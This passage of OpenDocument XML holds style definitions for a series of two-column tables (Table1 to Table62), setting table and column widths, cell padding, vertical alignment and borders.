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Table1" style:family="table">
      <style:table-properties style:width="6.406cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table1.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table1.B" style:family="table-column">
      <style:table-column-properties style:column-width="5.981cm"/>
    </style:style>
    <style:style style:name="Table1.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table2" style:family="table">
      <style:table-properties style:width="3.443cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table2.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table2.B" style:family="table-column">
      <style:table-column-properties style:column-width="3.018cm"/>
    </style:style>
    <style:style style:name="Table2.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table3" style:family="table">
      <style:table-properties style:width="8.311cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table3.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table3.B" style:family="table-column">
      <style:table-column-properties style:column-width="7.886cm"/>
    </style:style>
    <style:style style:name="Table3.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table4" style:family="table">
      <style:table-properties style:width="16.566cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table4.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table4.B" style:family="table-column">
      <style:table-column-properties style:column-width="16.141cm"/>
    </style:style>
    <style:style style:name="Table4.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table5" style:family="table">
      <style:table-properties style:width="9.37cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table5.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table5.B" style:family="table-column">
      <style:table-column-properties style:column-width="8.945cm"/>
    </style:style>
    <style:style style:name="Table5.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table6" style:family="table">
      <style:table-properties style:width="16.566cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table6.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table6.B" style:family="table-column">
      <style:table-column-properties style:column-width="16.141cm"/>
    </style:style>
    <style:style style:name="Table6.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table7" style:family="table">
      <style:table-properties style:width="16.566cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table7.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table7.B" style:family="table-column">
      <style:table-column-properties style:column-width="16.141cm"/>
    </style:style>
    <style:style style:name="Table7.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table8" style:family="table">
      <style:table-properties style:width="15.085cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table8.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table8.B" style:family="table-column">
      <style:table-column-properties style:column-width="14.66cm"/>
    </style:style>
    <style:style style:name="Table8.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table9" style:family="table">
      <style:table-properties style:width="11.063cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table9.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table9.B" style:family="table-column">
      <style:table-column-properties style:column-width="10.638cm"/>
    </style:style>
    <style:style style:name="Table9.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table10" style:family="table">
      <style:table-properties style:width="8.523cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table10.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table10.B" style:family="table-column">
      <style:table-column-properties style:column-width="8.098cm"/>
    </style:style>
    <style:style style:name="Table10.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table11" style:family="table">
      <style:table-properties style:width="11.486cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table11.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table11.B" style:family="table-column">
      <style:table-column-properties style:column-width="10.85cm"/>
    </style:style>
    <style:style style:name="Table11.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table12" style:family="table">
      <style:table-properties style:width="17.413cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table12.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table12.B" style:family="table-column">
      <style:table-column-properties style:column-width="16.776cm"/>
    </style:style>
    <style:style style:name="Table12.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table13" style:family="table">
      <style:table-properties style:width="9.158cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table13.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table13.B" style:family="table-column">
      <style:table-column-properties style:column-width="8.733cm"/>
    </style:style>
    <style:style style:name="Table13.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table14" style:family="table">
      <style:table-properties style:width="12.756cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table14.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table14.B" style:family="table-column">
      <style:table-column-properties style:column-width="12.331cm"/>
    </style:style>
    <style:style style:name="Table14.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table15" style:family="table">
      <style:table-properties style:width="13.391cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table15.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table15.B" style:family="table-column">
      <style:table-column-properties style:column-width="12.966cm"/>
    </style:style>
    <style:style style:name="Table15.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table16" style:family="table">
      <style:table-properties style:width="73.505cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table16.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table16.B" style:family="table-column">
      <style:table-column-properties style:column-width="73.08cm"/>
    </style:style>
    <style:style style:name="Table16.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table17" style:family="table">
      <style:table-properties style:width="50.645cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table17.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table17.B" style:family="table-column">
      <style:table-column-properties style:column-width="50.22cm"/>
    </style:style>
    <style:style style:name="Table17.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table18" style:family="table">
      <style:table-properties style:width="18.895cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table18.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table18.B" style:family="table-column">
      <style:table-column-properties style:column-width="18.47cm"/>
    </style:style>
    <style:style style:name="Table18.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table19" style:family="table">
      <style:table-properties style:width="24.398cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table19.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table19.B" style:family="table-column">
      <style:table-column-properties style:column-width="23.973cm"/>
    </style:style>
    <style:style style:name="Table19.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table20" style:family="table">
      <style:table-properties style:width="45.565cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table20.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table20.B" style:family="table-column">
      <style:table-column-properties style:column-width="45.14cm"/>
    </style:style>
    <style:style style:name="Table20.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table21" style:family="table">
      <style:table-properties style:width="8.735cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table21.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table21.B" style:family="table-column">
      <style:table-column-properties style:column-width="8.31cm"/>
    </style:style>
    <style:style style:name="Table21.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table22" style:family="table">
      <style:table-properties style:width="22.281cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table22.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table22.B" style:family="table-column">
      <style:table-column-properties style:column-width="21.645cm"/>
    </style:style>
    <style:style style:name="Table22.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table23" style:family="table">
      <style:table-properties style:width="9.158cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table23.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table23.B" style:family="table-column">
      <style:table-column-properties style:column-width="8.733cm"/>
    </style:style>
    <style:style style:name="Table23.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table24" style:family="table">
      <style:table-properties style:width="8.311cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table24.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table24.B" style:family="table-column">
      <style:table-column-properties style:column-width="7.886cm"/>
    </style:style>
    <style:style style:name="Table24.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table25" style:family="table">
      <style:table-properties style:width="16.355cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table25.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table25.B" style:family="table-column">
      <style:table-column-properties style:column-width="15.718cm"/>
    </style:style>
    <style:style style:name="Table25.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table26" style:family="table">
      <style:table-properties style:width="8.523cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table26.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table26.B" style:family="table-column">
      <style:table-column-properties style:column-width="8.098cm"/>
    </style:style>
    <style:style style:name="Table26.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table27" style:family="table">
      <style:table-properties style:width="8.1cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table27.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table27.B" style:family="table-column">
      <style:table-column-properties style:column-width="7.675cm"/>
    </style:style>
    <style:style style:name="Table27.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table28" style:family="table">
      <style:table-properties style:width="14.45cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table28.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table28.B" style:family="table-column">
      <style:table-column-properties style:column-width="13.813cm"/>
    </style:style>
    <style:style style:name="Table28.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table29" style:family="table">
      <style:table-properties style:width="21.223cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table29.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table29.B" style:family="table-column">
      <style:table-column-properties style:column-width="20.798cm"/>
    </style:style>
    <style:style style:name="Table29.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table30" style:family="table">
      <style:table-properties style:width="14.873cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table30.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table30.B" style:family="table-column">
      <style:table-column-properties style:column-width="14.448cm"/>
    </style:style>
    <style:style style:name="Table30.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table31" style:family="table">
      <style:table-properties style:width="9.158cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table31.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table31.B" style:family="table-column">
      <style:table-column-properties style:column-width="8.733cm"/>
    </style:style>
    <style:style style:name="Table31.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table32" style:family="table">
      <style:table-properties style:width="15.508cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table32.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table32.B" style:family="table-column">
      <style:table-column-properties style:column-width="15.083cm"/>
    </style:style>
    <style:style style:name="Table32.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table33" style:family="table">
      <style:table-properties style:width="15.296cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table33.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table33.B" style:family="table-column">
      <style:table-column-properties style:column-width="14.66cm"/>
    </style:style>
    <style:style style:name="Table33.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table34" style:family="table">
      <style:table-properties style:width="45.988cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table34.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table34.B" style:family="table-column">
      <style:table-column-properties style:column-width="45.351cm"/>
    </style:style>
    <style:style style:name="Table34.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table35" style:family="table">
      <style:table-properties style:width="8.1cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table35.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table35.B" style:family="table-column">
      <style:table-column-properties style:column-width="7.675cm"/>
    </style:style>
    <style:style style:name="Table35.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table36" style:family="table">
      <style:table-properties style:width="21.435cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table36.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table36.B" style:family="table-column">
      <style:table-column-properties style:column-width="20.798cm"/>
    </style:style>
    <style:style style:name="Table36.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table37" style:family="table">
      <style:table-properties style:width="11.275cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table37.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table37.B" style:family="table-column">
      <style:table-column-properties style:column-width="10.85cm"/>
    </style:style>
    <style:style style:name="Table37.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table38" style:family="table">
      <style:table-properties style:width="21.223cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table38.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table38.B" style:family="table-column">
      <style:table-column-properties style:column-width="20.798cm"/>
    </style:style>
    <style:style style:name="Table38.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table39" style:family="table">
      <style:table-properties style:width="21.646cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table39.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table39.B" style:family="table-column">
      <style:table-column-properties style:column-width="21.221cm"/>
    </style:style>
    <style:style style:name="Table39.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table40" style:family="table">
      <style:table-properties style:width="15.085cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table40.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table40.B" style:family="table-column">
      <style:table-column-properties style:column-width="14.448cm"/>
    </style:style>
    <style:style style:name="Table40.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table41" style:family="table">
      <style:table-properties style:width="15.508cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table41.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table41.B" style:family="table-column">
      <style:table-column-properties style:column-width="15.083cm"/>
    </style:style>
    <style:style style:name="Table41.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table42" style:family="table">
      <style:table-properties style:width="11.486cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table42.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table42.B" style:family="table-column">
      <style:table-column-properties style:column-width="11.061cm"/>
    </style:style>
    <style:style style:name="Table42.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table43" style:family="table">
      <style:table-properties style:width="17.625cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table43.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table43.B" style:family="table-column">
      <style:table-column-properties style:column-width="16.988cm"/>
    </style:style>
    <style:style style:name="Table43.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table44" style:family="table">
      <style:table-properties style:width="59.323cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table44.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table44.B" style:family="table-column">
      <style:table-column-properties style:column-width="58.686cm"/>
    </style:style>
    <style:style style:name="Table44.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table45" style:family="table">
      <style:table-properties style:width="15.085cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table45.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table45.B" style:family="table-column">
      <style:table-column-properties style:column-width="14.66cm"/>
    </style:style>
    <style:style style:name="Table45.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table46" style:family="table">
      <style:table-properties style:width="28.208cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table46.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table46.B" style:family="table-column">
      <style:table-column-properties style:column-width="27.783cm"/>
    </style:style>
    <style:style style:name="Table46.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table47" style:family="table">
      <style:table-properties style:width="20.165cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table47.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table47.B" style:family="table-column">
      <style:table-column-properties style:column-width="19.74cm"/>
    </style:style>
    <style:style style:name="Table47.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table48" style:family="table">
      <style:table-properties style:width="11.486cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table48.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table48.B" style:family="table-column">
      <style:table-column-properties style:column-width="11.061cm"/>
    </style:style>
    <style:style style:name="Table48.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table49" style:family="table">
      <style:table-properties style:width="15.72cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table49.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table49.B" style:family="table-column">
      <style:table-column-properties style:column-width="15.083cm"/>
    </style:style>
    <style:style style:name="Table49.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table50" style:family="table">
      <style:table-properties style:width="20.165cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table50.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table50.B" style:family="table-column">
      <style:table-column-properties style:column-width="19.74cm"/>
    </style:style>
    <style:style style:name="Table50.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table51" style:family="table">
      <style:table-properties style:width="17.836cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table51.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table51.B" style:family="table-column">
      <style:table-column-properties style:column-width="17.2cm"/>
    </style:style>
    <style:style style:name="Table51.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table52" style:family="table">
      <style:table-properties style:width="16.566cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table52.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table52.B" style:family="table-column">
      <style:table-column-properties style:column-width="16.141cm"/>
    </style:style>
    <style:style style:name="Table52.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table53" style:family="table">
      <style:table-properties style:width="20.165cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table53.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table53.B" style:family="table-column">
      <style:table-column-properties style:column-width="19.74cm"/>
    </style:style>
    <style:style style:name="Table53.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table54" style:family="table">
      <style:table-properties style:width="12.121cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table54.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table54.B" style:family="table-column">
      <style:table-column-properties style:column-width="11.696cm"/>
    </style:style>
    <style:style style:name="Table54.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table55" style:family="table">
      <style:table-properties style:width="20.376cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table55.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table55.B" style:family="table-column">
      <style:table-column-properties style:column-width="19.74cm"/>
    </style:style>
    <style:style style:name="Table55.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table56" style:family="table">
      <style:table-properties style:width="18.26cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table56.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table56.B" style:family="table-column">
      <style:table-column-properties style:column-width="17.835cm"/>
    </style:style>
    <style:style style:name="Table56.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table57" style:family="table">
      <style:table-properties style:width="14.873cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table57.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table57.B" style:family="table-column">
      <style:table-column-properties style:column-width="14.448cm"/>
    </style:style>
    <style:style style:name="Table57.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table58" style:family="table">
      <style:table-properties style:width="20.376cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table58.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table58.B" style:family="table-column">
      <style:table-column-properties style:column-width="19.74cm"/>
    </style:style>
    <style:style style:name="Table58.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table59" style:family="table">
      <style:table-properties style:width="20.376cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table59.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table59.B" style:family="table-column">
      <style:table-column-properties style:column-width="19.74cm"/>
    </style:style>
    <style:style style:name="Table59.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table60" style:family="table">
      <style:table-properties style:width="39.85cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table60.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.425cm"/>
    </style:style>
    <style:style style:name="Table60.B" style:family="table-column">
      <style:table-column-properties style:column-width="39.425cm"/>
    </style:style>
    <style:style style:name="Table60.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table61" style:family="table">
      <style:table-properties style:width="13.391cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table61.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table61.B" style:family="table-column">
      <style:table-column-properties style:column-width="12.755cm"/>
    </style:style>
    <style:style style:name="Table61.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.049cm" fo:border="none"/>
    </style:style>
    <style:style style:name="Table62" style:family="table">
      <style:table-properties style:width="16.778cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table62.A" style:family="table-column">
      <style:table-column-properties style:column-width="0.637cm"/>
    </style:style>
    <style:style style:name="Table62.B" style:family="table-column">
      <style:table-column-properties style:column-width="16.141cm"/>
    </style:style>
